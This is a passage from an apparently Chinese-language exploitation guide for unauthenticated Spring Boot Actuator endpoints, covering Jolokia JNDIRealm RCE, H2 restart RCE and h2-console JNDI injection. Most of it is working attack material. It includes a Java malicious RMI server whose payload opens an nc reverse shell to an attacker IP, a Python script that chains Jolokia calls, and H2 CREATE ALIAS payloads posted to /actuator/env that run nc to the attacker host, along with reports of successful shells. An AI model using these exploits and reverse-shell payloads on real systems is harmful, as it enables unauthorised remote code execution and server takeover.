<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发送恶意 payload</strong></p>
<p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行</p>
<h5 id="利用实例-4"><a href="#利用实例-4" class="headerlink" title="利用实例"></a>利用实例</h5><p>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;4f19e2342528cdbb64de48d186e11598.png)</p>
<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
<p>使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;22d452ce68c413decf2ec38b91407be8.png)</p>
<p>在kali上使用nc监听1234端口</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;6c60a7d0bba412dd195a483ca8f132df.png)</p>
<p>使用exploit.py脚本对目标进行重放</p>
<p>代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://192.168.233.249:8090/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在kali上使用python运行该脚本，指定目标ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:python exploit.py http://192.168.233.247:8090</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;9a08beff758b28b994d334ea398a856f.png)</p>
<p>该脚本运行成功后，可以看到kali的nc反弹shell成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;f234a703de0dd6e5042e6ee09f60fb1e.png)</p>
<h5 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>创建 JNDIRealm</li>
<li>写入 contextFactory 为 RegistryContextFactory</li>
<li>写入 connectionURL 为你的 RMI Service URL</li>
<li>停止 Realm</li>
<li>启动 Realm 以触发 JNDI 注入</li>
</ul>
<p>详细分析请参见</p>
<p><a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
<h4 id="2-6-restart-h2-database-query-RCE"><a href="#2-6-restart-h2-database-query-RCE" class="headerlink" title="2.6.restart h2 database query RCE"></a>2.6.restart h2 database query RCE</h4><h5 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>
<h5 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</strong></p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>
<p>spring 1.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>str1,str2和str3这三个参数组成要执行的命令</strong></p>
<p>spring 2.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-5"><a href="#利用实例-5" class="headerlink" title="利用实例"></a>利用实例</h5><p>首先判断在&#x2F;env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query</p>
<p>![image-20210830180327037](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830180327037.png)</p>
<p>构造Post请求&#x2F;actuator&#x2F;env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口</p>
<p>请求数据包如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T6 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T6(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行</strong></p>
<p>![image-20210830180618708](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830180618708.png)</p>
<p>在自己的主机上使用nc监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造请求&#x2F;actuator&#x2F;restart数据包，重启</p>
<p>![image-20210830180129484](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830180129484.png)</p>
<p>重启后，可以看到目标连接成功</p>
<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830181954887.png)</p>
<h5 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
<li>restart 重启应用，会建立新的数据库连接</li>
<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ul>
<p>详细分析参见下文</p>
<p><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
<h4 id="2-7restart-spring-datasource-data-h2-database-RCE"><a href="#2-7restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="2.7restart spring.datasource.data h2 database RCE"></a>2.7restart spring.datasource.data h2 database RCE</h4><h5 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
</ul>
<h5 id="利用方法-8"><a href="#利用方法-8" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：编写sql 文件并托管</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;ip地址&#x27;,&#x27;port&#x27;);</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.datasource.data 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="利用实例-6"><a href="#利用实例-6" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m    SimpleHTTPServer    8080</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求数据包对&#x2F;actuator&#x2F;env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831171742647](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831171742647.png)</p>
<p>在调用&#x2F;actuator&#x2F;restart端点进行重启springboot项目</p>
<p>![image-20210831173855310](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831173855310.png)</p>
<p>重启springboot后反弹shell成功</p>
<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830181954887.png)</p>
<h5 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot-autoconfigure<code>组件中的</code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java<code>文件代码逻辑中会使用</code>runScripts&#96; 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见如下；</p>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p>
<h4 id="2-8-h2-database-console-JNDI-RCE"><a href="#2-8-h2-database-console-JNDI-RCE" class="headerlink" title="2.8.h2 database console JNDI RCE"></a>2.8.h2 database console JNDI RCE</h4><h5 id="利用条件-10"><a href="#利用条件-10" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
<li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li>
</ul>
<h5 id="利用方法-9"><a href="#利用方法-9" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：访问路由获得 jsessionid</strong></p>
<p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：打包JAVA代码</strong></p>
<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发包触发 JNDI 注入</strong></p>
<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>RMI://your-vps-ip:port/jndi</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://your-vps-ip:port/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>



<h5 id="利用实例-7"><a href="#利用实例-7" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点的&#x2F;h2-console页面，url会跳转到&#x2F;h2-console&#x2F;login.jsp?jsessionid&#x3D;10f21eec1f912ae36cd39c55740101b5</p>
<p>![image-20210830204241737](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210830204241737.png)</p>
<p>这里的开启RMI服务JAVA代码如下:</p>
<p>反弹shell到192.168.233.242的1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
